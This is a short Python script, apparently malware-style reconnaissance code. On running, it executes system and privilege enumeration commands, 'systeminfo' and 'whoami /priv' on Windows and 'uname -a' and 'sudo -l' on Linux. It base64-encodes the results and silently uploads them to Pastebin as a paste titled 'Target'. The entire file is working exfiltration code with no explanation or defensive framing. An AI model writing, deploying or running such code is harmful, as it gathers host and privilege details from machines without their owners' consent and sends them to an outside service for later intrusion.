
import requests
import subprocess
import os
import base64

def upload_pstbin(result):
    url = 'https://pastebin.com/api/api_post.php'
    api ={'api_dev_key' : "",
          'api_paste_code' :  result,
          'api_paste_name' : 'Target',
          'api_option' : 'paste'
          }
    try:
        send = requests.post(url, data=api)
    except:
        pass

def windows_check():
    run = ["systeminfo","whoami","whoami /priv"]
    data=[]
    for i in run:
        temp1 = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        str,strerr=temp1.communicate()
        if strerr != b'':
            data.append(i)
            data.append(strerr.decode())
        else:
            data.append(str.decode())
    data ="\n".join(data)
    upload_pstbin(base64.b64encode(data.encode()))

def linux_check():
    run = ["uname -a","sudo -l","hostname"]
    data=[]
    for i in run:
        temp1 = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        str,strerr=temp1.communicate()
        if strerr != b'':
            data.append(i)
            data.append(strerr.decode())
        else:
            data.append(str.decode())
    data ="\n".join(data)
    upload_pstbin(base64.b64encode(data.encode()))   

def main():
    if os.name == "nt":
        windows_check()
    else:
        linux_check()
main()






